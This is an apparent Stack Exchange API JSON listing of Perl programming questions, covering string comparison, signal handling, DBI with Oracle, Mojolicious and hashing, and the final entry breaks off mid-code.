{"total":22324,"page":1,"pagesize":100,"questions":[{"tags":["string","perl","match"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":15,"score":2,"question_id":13298585,"title":"Strings matching","body":"<p>i wrote a code:</p>\n\n<pre><code>my $str = 'http://www.ykt.ru/cgi-bin/go?http://ya.ru';\nmy $str2 = 'http://ya.ru';\nif ($str == $str2)\n{\n    print \"str = str2\";\n}\nelse \n{\n    print \"str != str2\";\n}\n</code></pre>\n\n<p>and it shows me that str = str2. But it's false. Only if $str = 'http://ya.ru'; It will be true. Whats wrong?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":13,"score":1,"question_id":13298345,"title":"Confusing Perl Array behavior","body":"<p>I'm working with the Perl API of an Infoblox appliance (doc: <a href=\"https://ipam.illinois.edu/api/doc/\" rel=\"nofollow\">https://ipam.illinois.edu/api/doc/</a>)</p>\n\n<p>I have the following code:</p>\n\n<pre><code>...\n\nmy $specificRecord = $recordResults[0];\n\nsay $specificRecord-&gt;name();\n\nforeach ($specificRecord-&gt;ipv4addrs())\n{\n    say $_;\n}\n</code></pre>\n\n<p>$specificRecord contains an Infoblox::DNS::Host record object.</p>\n\n<p>My problem comes when I'm iterating over ipv4addrs(). According to the documentation and the perl debugger, ipv4addrs() returns an ARRAY containing IPs or DHCP::FixedAddr objects.</p>\n\n<p>In my case, if I debug my program and \"x\" $specificRecord->ipv4addrs() as well as $_, I get the same result:</p>\n\n<pre><code>DB&lt;1&gt; b 70\n\nDB&lt;2&gt; c\nResults: 1\naaaa9999test.justice\nmain::(testScript2.pl:70):          foreach ($specificRecord-&gt;ipv4addrs())\nmain::(testScript2.pl:71):          {\n\nDB&lt;2&gt; x $specificRecord-&gt;ipv4addrs();\n0  ARRAY(0x64e9e3c)\n   0  '8.8.8.8'\n   1  '8.8.4.4'\n\nDB&lt;3&gt; n\nmain::(testScript2.pl:72):              say $_;\n\nDB&lt;3&gt; x $_;\n0  ARRAY(0x64e9e3c)\n   0  '8.8.8.8'\n   1  '8.8.4.4'\n</code></pre>\n\n<p>Here is a relevant portion of \"x\" of the Infoblox::DNS::Host object:</p>\n\n<pre><code>DB&lt;2&gt; x $specificRecord;\n0  Infoblox::DNS::Host=HASH(0x8b3eacc)\n   '__object_id__' =&gt; 'dns.host$._default.justice.aaaa9999test'\n   'aliases' =&gt; ARRAY(0x8b3e9fc)\n        empty array\n   'configure_for_dns' =&gt; 'true'\n   'disable' =&gt; 'false'\n   'ipv4addrs' =&gt; ARRAY(0x64e9e3c)\n      0  '8.8.8.8'\n      1  '8.8.4.4'\n   'ipv6addrs' =&gt; ARRAY(0x8aa1bac)\n        empty array\n   'name' =&gt; 'aaaa9999test.justice'\n   ...\n</code></pre>\n\n<p>I can't tell what I'm doing wrong and why foreach doesn't work with the $_ variable. I tried assigning ipv4addrs() to an array and then foreaching over that, to no avail.</p>\n"},{"tags":["perl","signals","runtime-error"],"answer_count":0,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":34,"score":3,"question_id":13279600,"title":"SIG error during global destruction","body":"<p>I have an issue with a script I created. This is the first time I use signal as I would like my script to run like a daemon, so I set several signal Handler to properly end my script :</p>\n\n<pre><code>local $SIG{HUP} = \\&amp;StopSuperviser;\nlocal $SIG{INT} = \\&amp;StopSuperviser;\nlocal $SIG{QUIT} = \\&amp;StopSuperviser;\nlocal $SIG{ILL} = \\&amp;StopSuperviser;\nlocal $SIG{ABRT} = \\&amp;StopSuperviser;\nlocal $SIG{TERM} = \\&amp;StopSuperviser;\n</code></pre>\n\n<p>This is working properly but when I send one of those signal to my script (Crt-C, kill -15, kill -1 ...) the StopSuperviser function is correctly called but I always receive the following error in my script's output:</p>\n\n<blockquote>\n  <p>Argument \"HUP\" isn't numeric in null operation during global destruction.</p>\n</blockquote>\n\n<p>I have searched on google but I didn't find anything dealing with this behavior.</p>\n\n<p>May someone put some light in this?</p>\n\n<p>Thanks you very much for your help</p>\n\n<p>Best Regards</p>\n\n<p>Florent</p>\n\n#\n\n<p>Thanks four your replies, here is the StopSuperviser Function:</p>\n\n<pre><code>sub StopSuperviser\n{\n    print \"On quite\\n\";\n    $StopAlarm = 1;\n    &amp;DeleteThreadOrder($AllProcess);\n    foreach my $Subprocess (@$AllProcess) {\n        foreach my $thread (@{$Subprocess-&gt;{Thread}}) {\n            $thread-&gt;kill('USR1');\n            $thread-&gt;join();\n        }\n    }\n    exit;\n}\n</code></pre>\n\n<p>I also use the following package :</p>\n\n<pre><code>use Alarm::Concurrent;\n</code></pre>\n\n<p>This may important to know, or may not :)\nHope this help :)</p>\n\n<p>Thanks again for your response and help</p>\n\n<p>Best Regards</p>\n\n<p>Florent</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13295665,"title":"Find::File to search a directory of a list of files","body":"<p>I'm writing a Perl script and I'm new to Perl -- I have a file that contains a list of files. For each item on the list I want to search a given directory and its sub-directories to find the file return the full path.  I've been unsuccessful thus far trying to use File::Find. Here's what I got:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse File::Find;\n\nmy $directory = '/home/directory/';\nmy $input_file = '/home/directory/file_list'; \nmy @file_list;\n\n\nfind(\\&amp;wanted, $directory);\n\nsub wanted {\n    open (FILE, $input_file);\n\n    foreach my $file (&lt;FILE&gt;) {\n        chomp($file);\n\n        push ( @file_list, $file );\n    }   \n\n    close (FILE);\n\n    return @file_list;\n}\n</code></pre>\n"},{"tags":["php","perl","symfony2","controller"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13287716,"title":"How do I call a perl script from my Symfony2 controller?","body":"<p>I am trying to implement an automatic submission to an information management system from within my Symfony2 application.  Someone else has written a perl script for the submission.  I just need to use the controller to get values from an entity to pass to the script as arguments.</p>\n\n<p>I have tested the perl script by running a short php script from the command line:</p>\n\n<pre><code>&lt;?php\n\n$perlscript = 'test_submit_to_lims.pl';\n\n$output = \\shell_exec('perl ' . $perlscript . \" 'arg1' 'arg2' 'arg3' \");\necho $output;\n\n?&gt;\n</code></pre>\n\n<p>This returns a string with some values of interest which I need for my application.  </p>\n\n<p>I have put the perl script and dependent files in a folder called dependencies at the same level as my Symfony project folder</p>\n\n<p>I tried to use similar code in my controller: </p>\n\n<pre><code>...\n\n$arg1 = $form-&gt;get('arg1')-&gt;getData();\n$arg2 = $form-&gt;get('arg2')-&gt;getData();\n$arg3 = $form-&gt;get('arg3')-&gt;getData();\n$pathToScript = '/opt/sfprojects/dependencies';\n$perlScript = \"$pathToScript/test_submit_to_lims.pl\";\n$output = \\shell_exec('perl '.$perlScript.\" $arg1 $arg2 $arg3 \");\nvar_dump($output);\n\n...\n</code></pre>\n\n<p>This gives me \"Network Error: 500 Internal Server Error - <a href=\"http://www2-mywebsite.org/myEntity/create\" rel=\"nofollow\">http://www2-mywebsite.org/myEntity/create</a>\"</p>\n\n<p>I'm not sure whether the error is caused by something simple in my php code, by the need to somehow enable perl in a Symfony configuration file or something else like the location of the script, file permissions, etc.</p>\n\n<p>I would appreciate any ideas of where I may have gone wrong.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13297825,"title":"How can I iterate over an array with foreach without changing the address of the loop variable?","body":"<p>When I run a simple bit of code like this:</p>\n\n<pre><code>my @arr=(1..5);\nmy $x;\nforeach $x (@arr) {\n    $x+=10;\n}\nprint \"@arr\";\n</code></pre>\n\n<p>The result is \"11 12 13 14 15\" because $x \"becomes\" each element in the @arr array in the foreach.  Well enough.</p>\n\n<p>But here's my thing... not so much a problem (the solution is easy, but inelegant, and I want my perl to be as elegant as possible).</p>\n\n<p>I wrote a tie module for dealing with COBOL data.  It takes a copybook, parses the fields, and then attaches that to a scalar/string so that access to/from the tied hash will return/set values in the string.  It works wonderfully.</p>\n\n<pre><code>my %h,$rec;\nmy $cb=&lt;&lt;END;\n       01 CH-RECORD.\n          05 JOB-NUM PIC X.\n          05 FILLER  PIC X(76).\n          05 REC-TYPE PIC X(2).\nEND\ntie %h, 'COBOLDataTie',$cb,\\$rec; #tie the hash to the record via the copybook\n</code></pre>\n\n<p>From there, I can move a COBOL record to $rec and access the COBOL fields with the %h hash.</p>\n\n<p>Again, this works perfectly.  But the problem comes when I want to iterate over, say, an array of COBOL records.  So if after the above code I had something akin to:</p>\n\n<pre><code>foreach $rec (@arr) {\n    print \"Job is \",$h{'JOB-NUM'},\"\\n\";\n}\n</code></pre>\n\n<p>it won't work because the foreach actually changes the location of $rec, which breaks the tie on it.  I end up having to do something like this:</p>\n\n<pre><code>foreach (@arr) {\n    $rec=$_;\n    print \"Job is \",$h{'JOB-NUM'},\"\\n\";\n}\n</code></pre>\n\n<p>Is there any way I can do the \"foreach $rec (@arr)\" and not break my tied hash?</p>\n\n<p>(And before anyone says, yes I know this begs for a nice object-oriented solution... some day I'll get to that; I just have to find some time first)</p>\n"},{"tags":["perl","extjs","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13291449,"title":"output json data dynamically from perl cgi","body":"<p>I have a simple perl cgi that i use in my extjs project, written like this : </p>\n\n<pre><code>use JSON;\n\nprint \"Content-type: application/json\\n\\n\";\n\nmy $node_hash = {\ndata =&gt; [{\n     \"Week\",1145,\n         \"Sev_Logged\", \"3_major\"\n},{\n    \"Week\", 1146,\n        \"Sev_Logged\", \"4_minor\"\n}]};\nprint to_json($node_hash);\n</code></pre>\n\n<p>Which returns data written in json format that i use to generate a chart.\nI also have a form which contains a combobox with values : \"3_major\" and \"4_minor\" corresponding to the \"Sev_Logged\" field.\nNow what i want is, whenever the user chooses \"4_minor\", my perl cgi will only return week 1146, thus my chart will only contain data of week 1146.</p>\n\n<p>Is this possible? How?\nThank you</p>\n"},{"tags":["perl","file","bash","awk","ls"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":38,"score":-2,"question_id":13296068,"title":"How to find last modified file and it's timestamp no later than today?","body":"<p>I have a list of files named filename.${date}, for example foo.20121102 and I want to print the last modified file that has the timestamp  up to today using bash toolset.</p>\n"},{"tags":["perl","inheritance","moose"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":22,"score":2,"question_id":13294996,"title":"Moose Parent and Child with same attribute names","body":"<p>This question is in regards to Perl and Moose inheritance.</p>\n\n<p>Suppose I have a Parent Class and a Baby Class. Baby 'extends' Parent. If both classes have the attribute 'name', how does the Baby access the parent's name without getting its own name?</p>\n\n<pre><code>package Baby;\nuse Moose;\nextends 'Parent';\n\nhas 'name', is =&gt; 'ro', isa =&gt; 'Str', default =&gt; 'Baby';\n</code></pre>\n\n<p>Note: The Parent Class is essentially the same with name default => 'Parent'.</p>\n\n<p>So the question is, inside my program how would I access the Parent's name?</p>\n\n<p>For example:</p>\n\n<pre><code>...\n$baby = Baby-&gt;new();\nsay \"my name is \" . $baby-&gt;name();\nsay \"my Parent's name is \" . ???? \n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1794,"score":0,"question_id":4732937,"title":"How do I read a file line by line while modifying lines as needed?","body":"<p>In Perl, I'm trying to read a file line by line and process each line, modifying it as required.\nSo far, the only way I'm reading to be able to do this is read the file into an array, modify each element of the array as needed, then when it's finished, output it back to the file.</p>\n\n<p>Is there a better way to do this, perhaps some way I can replace single lines as I go along?</p>\n\n<p>Right now, my processing code looks like this:</p>\n\n<pre><code>while (my $line = &lt;FILE&gt;)\n{\n    # process line here\n    # ...........\n\n    print FILE $line;\n}\n</code></pre>\n\n<p>My code seems to be very close, except that it's replacing one line after the line I'm currently in, so it seems that if I could back the file pointer up by one line, it would write to the correct place in the file.</p>\n\n<p>Am I on the right track? What would I need to do from here to back up the file pointer so it writes to the same line I'm reading from?</p>\n\n<hr>\n\n<p><em>Edit:</em></p>\n\n<p>Out of the answers I received, both using <code>local $^I</code> and <a href=\"http://p3rl.org/Tie%3a%3aFile\" rel=\"nofollow\"><code>Tie::File</code></a> worked nicely.\nI ended up going with <code>Tie::File</code> so I wouldn't have to print out every line of the file. This way if something happens midway through the script, my file won't be messed up.</p>\n\n<p>My new code looks like this:</p>\n\n<pre><code>use Tie::File;\n\nchomp(my $filename = $ARGV[0]);\ntie my @array, 'Tie::File', $filename or die $!;\n\nforeach my $line(@array)\n{\n    # ...... line processing happens here .......\n    # ...... $line is automatically written to file if $line is changed .......\n}\n</code></pre>\n"},{"tags":["perl","nagios","poe","nrpe"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":6,"score":0,"question_id":13295127,"title":"POE::Component::Server::NRPE, return-value","body":"<p>I try to use your CPAN-module POE::Compoenten::Server::NRPE.\nI tried the sample from the CPAN-site and tested against nagios-tool check_nrpe.</p>\n\n<p>the text was fine, but I am not able to get the correct return-value.\nyou described this return_result in the modules-description, but I am not aware how to use it.</p>\n\n<p>would be very nice, if you can give me a very short example, how to return a value &lt;> 0.</p>\n\n<p>thanks a lot!</p>\n\n<p>cheers,\nchristoph </p>\n\n<pre><code>use POE;\nuse POE::Component::Server::NRPE;\n\n# test with: check_nrpe -H localhost -c test; echo $?\n\nmy $nrped = POE::Component::Server::NRPE-&gt;spawn (port =&gt; 5666);\n$nrped-&gt;add_command (command =&gt; \"test\", program =&gt;\nsub { print STDOUT \"test CRITICAL\\n\";\nreturn 2;    # always 0???\n});\n\n$poe_kernel-&gt;run ();\nreturn 0; \n</code></pre>\n"},{"tags":["perl","die"],"answer_count":0,"favorite_count":2,"up_vote_count":0,"down_vote_count":12,"view_count":53,"score":-12,"question_id":13295078,"title":"Perl die command","body":"<p>What is the etymology of <code>die</code>? And why? The name perl is some reference to the bible but is <code>die</code> a command created by the nordic metal nerds who work as sys admins?</p>\n"},{"tags":["perl","mvc","mojolicious","mojolicious-lite"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":19,"score":2,"question_id":13293739,"title":"How to call action in some other controller in Mojolicious?","body":"<p>I have an application that uses the Mojolicious framework. I have a table in the database that has a list of error response and additional details associated with it. I have created corresponding Result and Resultset to work with the DB table. There is also a controller to get details about the Error by interacting with the Resultset. My idea is to Call an action in this controller that would get the details of the error that is passed to it(by another controller) by querying the database, add-in runtime information about the environment that requested for the resource that resulted in the error, create a respnose and return to the controller that called it. </p>\n\n<p>I am struggling with the call from one controller to another. How do I do it in mojolicious? I can pass the controller object(<code>$self</code>) to accomplish this, but is there a better way to do it, so that I separate entirely my error handling response from the calling controller?</p>\n"},{"tags":["perl","mojolicious","mojo"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":29,"score":0,"question_id":13290996,"title":"parsing with Mojo::DOM","body":"<p>I am using <code>Mojo::UserAgent-&gt;new</code> to fetch some XML which has the following format:</p>\n\n<pre><code>&lt;row&gt;\n&lt;td&gt; content1 &lt;/td&gt;\n&lt;td&gt; content2 &lt;/td&gt;\n&lt;td&gt; content3 &lt;/td&gt;\n&lt;/row&gt;\n&lt;row&gt;\n&lt;td&gt; content4 &lt;/td&gt;\n&lt;td&gt; content5 &lt;/td&gt;\n&lt;td&gt; content6 &lt;/td&gt;\n&lt;/row&gt;\n</code></pre>\n\n<p>Is it possible to view the results like this:</p>\n\n<pre><code>content1,content2,content3\ncontent4,content5,content6\n</code></pre>\n\n<p>below are the query i am using which get different resutls</p>\n\n<pre><code> $ua-&gt;get($url)-&gt;res-&gt;dom-&gt;at-&gt;(row)-&gt;children-&gt;each(sub {print \"$_\\t\"})\n</code></pre>\n"},{"tags":["perl","stack-trace","caller"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":61,"score":3,"question_id":13280722,"title":"Can I get Perl to not remove stack frames?","body":"<p>I've recently been working on some code to catch errors throughout our code base (I.E. do a try/catch at the very top level of our Perl code).  To my distress, I find that Perl stack traces omit stack frames!  Gaaa!  I'm looking for insight into why these stack frames are gone.  The documentation for caller() says stack frames can be 'optimized away'.  But really, it's so annoying to have them gone.  Is there a way to coax Perl into including them?  Is there a performance penalty for doing so?  Below is a trivial example.  As you will see, neither bar() nor bletch() are included in the stack trace. A sad omission that causes me to have to trace the code by hand.</p>\n\n<p>Any insights received with gratitude.</p>\n\n<p>Leonard</p>\n\n<p>Here is foo.pl</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse Devel::StackTrace;\nuse Try::Tiny;\n\nfoo();\n\nsub foo {\n    print \"In foo\\n\";\n    try {\n        bar();\n    }\n    catch {\n        my $trace = Devel::StackTrace-&gt;new();\n        print $trace-&gt;as_string;\n    };\n}\n\nsub bar {\n    print \"In bar\\n\";\n    bletch();\n    my $more_stuff = 123;\n    return $more_stuff;\n}\n\nsub bletch {\n    print \"In bletch\\n\";\n    my $not_so_defined;\n    $not_so_defined-&gt;barf();\n    print \"Unlikely to be printed\\n\";\n\n}\n</code></pre>\n\n<p>And here is what gets printed when foo.pl is run:</p>\n\n<pre><code>In foo\nIn bar\nIn bletch\nTrace begun at foo.pl line 17\nmain::__ANON__('Can\\'t call method \"barf\" on an undefined value at ./foo.pl line 32.^J') called at /vcm/home/apps/perl-5.12.1/lib/site_perl/5.12.1/Try/Tiny.pm line 100\nTry::Tiny::try('CODE(0xf503a0)', 'Try::Tiny::Catch=REF(0x1035ca0)') called at foo.pl line 19\nmain::foo at foo.pl line 9\n</code></pre>\n"},{"tags":["perl","thumbnails"],"answer_count":2,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1373,"score":4,"question_id":486874,"title":"Stretch, resize, or thumbnail an image using Perl","body":"<p>How can I stretch or resize an image (of any format) using a Perl script?</p>\n"},{"tags":["perl","imagemagick"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":16,"score":1,"question_id":13291293,"title":"Perl, Image::Magick, lost bytes when writing","body":"<p>Good evening.</p>\n\n<p>There is a problem.</p>\n\n<pre><code>my $image = Image::Magick-&gt;new;\n$image-&gt;Read($upload-&gt;tempname . '[0]');\n$image-&gt;Write(filename =&gt; $upload_file_name, compression =&gt; 'None');\n</code></pre>\n\n<p>After executing the file sizes ($upload->tempname and $upload_file_name) do not match.\nImage format is jpg ($upload->tempname is JPEG, $upload_file_name is JPEG).\nIn what could be wrong?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13289882,"title":"Cleaning up with die","body":"<p>I was wondering if there is any way of doing some clean up using die. For example, if I created some files, but I would like them to be deleted if the program runs into a situation where it needs to die.</p>\n\n<p>Thanks</p>\n"},{"tags":["mysql","perl","dbi"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":46,"score":3,"question_id":13285834,"title":"dbi gives undef as if empty but the query yields result in mysql","body":"<p>I have a mysql-query that yields only one row and column, when checking the query interactively I can see the result, which is what I want. But when I use \n<code>$sth-&gt;fetchrow_hashref;</code>\nI get undef.\nDoes anyone have any idea of what might be wrong here?\nI am thankful for any point in any direction.y produces your result.\n<br /><br />\nThis is done directly after the execute:</p>\n\n<pre><code>sub _get_next_hashref\n{\n    my $self = shift;\n    if($self-&gt;{sth} ne '') {\n    if(my $hash_ref = $self-&gt;{sth}-&gt;fetchrow_hashref)\n    {\n        return $hash_ref;\n    } else {\n        $self-&gt;{sth} = '';\n        return undef;\n        }\n    } else {\n    return undef;\n    }    \n}\n</code></pre>\n\n<p>Some additional information:\n<br />\nThe query executed ends with <code>limit 1</code>, so there should only be one row at all times. For some reason in-data that otherwise would result in more rows work perfectly, but in-data that only produces one-row-results does not work.</p>\n\n<pre><code>$sql = \"select sort_order from forum.metatag_sort where metatag=? order by id desc limit 1\";\n$self-&gt;{sth} = $self-&gt;{dbh}-&gt;prepare($sql);\nif($self-&gt;{sth}-&gt;execute(@args)) {\n    return _get_next_hashref();\n}\n</code></pre>\n\n<p>Within @args is only the metatag, an int.\n<br />\nCases where\n    <code>select count(sort_order) from forum.metatag_sort where metatag=?</code>\nwould return an answer greater than 1 works flawlessly for me, but cases where this would return exactly 1 fails.</p>\n"},{"tags":["perl","web-frameworks","template-toolkit","mojolicious"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":96,"score":3,"question_id":12864708,"title":"Mojolicious::Lite with Template Toolkit","body":"<p>I'm trying to get Template Toolkit to work as the default renderer in Mojolicious::Lite. What I have:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse Mojolicious::Lite;\nuse Mojolicious::Plugin::TtRenderer;\nplugin tt_renderer =&gt; { template_options =&gt; { INCLUDE_PATH =&gt; './tmpl', DEBUG =&gt; 1 } };\n\nget '/' =&gt; sub {\n  my $self = shift;\n\n  $self-&gt;render( 'index' );\n};\n\napp-&gt;renderer-&gt;default_handler( 'tt' );\napp-&gt;start;\n</code></pre>\n\n<p>When I try to hit the test server, I get:</p>\n\n<pre><code>[Fri Oct 12 14:02:02 2012] [info] Listening at \"http://*:3000\". \nServer available at http://127.0.0.1:3000. \n[Fri Oct 12 14:02:08 2012] [debug] Your secret passphrase needs to be changed!!! \n[Fri Oct 12 14:02:08 2012] [debug] GET / (Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:16.0) Gecko/20100101 Firefox/16.0). \n[Fri Oct 12 14:02:08 2012] [debug] Routing to a callback. \n[Fri Oct 12 14:02:08 2012] [debug] Nothing has been rendered, expecting delayed response.\n</code></pre>\n\n<p>This happens regardless of what I pass as parameters to 'render'. I can't seem to figure out how to get any useful debugging information out of this; but I haven't used Mojo before.</p>\n\n<p>I've confirmed by sprinkling in some <code>warn</code> statements that my <code>get</code> handler is being called.</p>\n"},{"tags":["perl","script","sed"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13288881,"title":"'sed' usage in perl script error","body":"<p>I have the following line in a Perl script:</p>\n\n<pre><code>my $temp = `sed 's/ /\\n/g' /sys/bus/w1/devices/w1_bus_master1/10-000802415bef/w1_slave | grep t= | sed 's/t=//'`;\n</code></pre>\n\n<p>Which throws up the error: \n\"sed: -e expression #1, char 2: unterminated `s' command\"</p>\n\n<p>If I run a shell script as below it works fine:</p>\n\n<pre><code>temp1=`sed 's/ /\\n/g' /sys/bus/w1/devices/w1_bus_master1/10-000802415bef/w1_slave | grep t= | sed 's/t=//'`\necho $temp1\n</code></pre>\n\n<p>Anyone got any ideas?</p>\n"},{"tags":["perl","iis","w3c"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":20,"score":2,"question_id":13286729,"title":"SGML::Parser::OpenSP - Open Jade Nightmare","body":"<p>I'm trying to install the W3C validator(local copy) and i have managed to install Perl and all it's modules except for SGML::Parser::OpenSP</p>\n\n<p>The problem I'm running into is that apparently i need OpenSP or OpenJade, and I've downloaded the source for both of those, but i cant compile it.</p>\n\n<p>I'm using </p>\n\n<blockquote>\n  <p>Windows 7 x64 </p>\n  \n  <p>IIS 7.5</p>\n  \n  <p>Active Perl 5.16.1</p>\n  \n  <p>Installing modules via CPANM</p>\n</blockquote>\n\n<p><strong>What am I asking help on?</strong>\nHow/Where can i get a working compilation of OpenSP or OpenJade, or install SGML without it.</p>\n\n<p>(Edit)\nThe guide i was using : <a href=\"http://validator.w3.org/docs/install_win.html\" rel=\"nofollow\">http://validator.w3.org/docs/install_win.html</a></p>\n\n<p>Your help would be appreciated more than you may think :)</p>\n"},{"tags":["arrays","perl","hash"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":104,"score":1,"question_id":12280080,"title":"Hash of arrays printing garbage values","body":"<p>I am trying to print data from a hash of arrays in a perl program.\nBut it prints some garbage values along with original data:</p>\n\n<pre><code>#!/usr/bin/perl\n\nmy %Quarter = (\n                June =&gt; [\"06/03/2012\", \"06/10/2012\", \"06/17/2012\", \"06/24/2012\"],\n                July =&gt; [\"07/01/2012\", \"07/08/2012\", \"07/15/2012\", \"07/22/2012\"],\n                August =&gt; [\"08/05/2012\", \"08/12/2012\", \"08/19/2012\", \"08/26/2012\"],\n);\n\n\nforeach my $month ( %Quarter ) {\n        print \"$month\\n\";\n}\n</code></pre>\n\n<p>output:</p>\n\n<pre><code>July\nARRAY(0x9281af8)\nJune\nARRAY(0x9281bdc)\nAugust\nARRAY(0x929ade8)\n</code></pre>\n\n<p>Any idea what is going wrong in this program.</p>\n\n<p>Thanks</p>\n"},{"tags":["perl","oracle","unix","freebsd","dbi"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":41,"score":3,"question_id":13280575,"title":"Perl script using DBI module with Oracle 8 stops processing","body":"<p>I'm having a problem with a Perl script that uses DBI module (version 1.601) connecting to Oracle 8. The OS is FreeBSD 7.0. </p>\n\n<p>The script just opens a connection, loops through a CSV file inserting data one row/line at a time, then closes the connection and exits. A cron job executes this script every 30 minutes processing any incoming CSV files. On occasion, the script stops processing midway through (no new data inserted, does not consume any more cpu time) and it becomes necessary to kill it.</p>\n\n<p>There appears to be a size threshold for the CSV file. Anything under 35000 rows, the script executes and exits ok. Otherwise it stalls and the process sits (seemingly) dormant/waiting. </p>\n\n<p>I only have remote access to Oracle8 through SQL*Plus. Checked the Oracle v$session table and see the connections for these stalled processes don't get closed, so perhaps hitting some resource limit? Running 'limits' on FreeBSD yields the following:</p>\n\n<pre><code>cputime          infinity secs\nfilesize         infinity kB\ndatasize           524288 kB\nstacksize           65536 kB\ncoredumpsize     infinity kB\nmemoryuse        infinity kB\nmemorylocked     infinity kB\nmaxprocesses         5547\nopenfiles           11095\nsbsize           infinity bytes\nvmemoryuse       infinity kB\n</code></pre>\n\n<p>I'm unsure how to proceed. How or where can I look to narrow down the problem?</p>\n\n<p>Any help is appreciated.</p>\n\n<hr>\n\n<p>Here is the script with changes to some var names and input checking code omitted:</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse DBI;\nuse strict;\n\nmy $exitstatus = 0;\nmy $infile = shift;\nopen (INFILE, \"$infile\");\n\nmy $dbh = DBI-&gt;connect(\n  'dbi:Oracle:sid=mysid;host=myhostname',\n  'myusername',\n  'mypassword',\n  {\n    RaiseError =&gt; 1,\n    AutoCommit =&gt; 1\n  }\n) or die $DBI::errstr;\n\nwhile (&lt;INFILE&gt;) {\n  chomp;\n  next if (/^#.*$/ || /^$/);\n  my @columns = split /\\t/;\n  my ($var1, $var2, $var3) = @columns;\n  eval {\n    my $oProce = qq{\n      BEGIN\n        InsertStoredProc(\n        field1 =&gt; $var1,\n        field2 =&gt; $var2,\n        field3 =&gt; $var3\n        );\n      END;\n    };\n    $dbh-&gt;do( $oProce );\n  };\n  if ( $@ ) {\n    $exitstatus=1;\n    warn \"LINE: @columns\\n\";\n    warn \"Execution of stored procedure failed: $DBI::errstr\\n\";\n    warn \"################################################################################\\n\";\n  }\n}\n$dbh-&gt;disconnect;\nclose INFILE;\nexit $exitstatus;\n</code></pre>\n"},{"tags":["perl","hash","hashcode"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13285849,"title":"hash value not coming correct while using @ in the string","body":"<p>I am trying to generate a hash value using this code</p>\n\n<pre><code>use Digest::SHA qw(sha1_hex); print sha1_hex(\"prady@prady.com\")\n</code></pre>\n\n<p>The generated value is </p>\n\n<blockquote>\n  <p>642732893b7d25cf6a47773fa1c4988fac2ff3ad</p>\n</blockquote>\n\n<p>When i check the hash code using the free generator </p>\n\n<p><a href=\"http://sha1-hash-online.waraxe.us/\" rel=\"nofollow\">http://sha1-hash-online.waraxe.us/</a></p>\n\n<p>i get the hash code as  </p>\n\n<blockquote>\n  <p>e49ece87a60590483bb74c24e82f9d64d13d98c1</p>\n</blockquote>\n\n<p>I performed the same test by removing the @ symbol from the string\ni get matching values from the website as well as the code.\nBoth return me the same hash code</p>\n\n<blockquote>\n  <p>08e1698b5818d8fdf0f7b31132c3b44c49671644</p>\n</blockquote>\n\n<p>Of the ones generated by the code and website which is the correct one ? Is this a known behavior while using @ symbol on string ?</p>\n"},{"tags":["linux","perl","module","mirror"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13283271,"title":"is there any Perl Module to replace the old mirror module?","body":"<p>Recently I need to touch a very old system running over the past 15 years with some Perl programs. Sadly I have very few experience using Perl as a program language. </p>\n\n<p>In the program the module <a href=\"http://gd.tuwien.ac.at/utils/archivers/mirror/mirror-faq.html\" rel=\"nofollow\">mirror</a> is used quite often. Obviously it is very old, and refers to some modules I guess is also outdated. </p>\n\n<p>Is there any newer module with similar functions and also easy to use?</p>\n\n<p>Thanks</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13285252,"title":"Readline on closed filehandle","body":"<p>I'm using this sub for my prgram to wait up to several hours for a task to finish what it's doing on windows.\nWhen the windows task finishes, it updates a string in a text file to let the Linux script know that Windows is done. </p>\n\n<p>I get this error while it's running:\nreadline() on closed filehandle</p>\n\n<p>Here is the sub</p>\n\n<pre><code>my $numberOfChecks = 28;\nmy $sleepTime = 900;\nmy $communicationsFile = \"/home/user/ICAhome/Win_To_Linux_ComFile.txt\";\nmy $winBuild = \"1\";\n\nsub waitForWindowsBuild {\n    while ($numberOfChecks-- $$ $winBuild == \"1\"){\n        open (MYFILE, 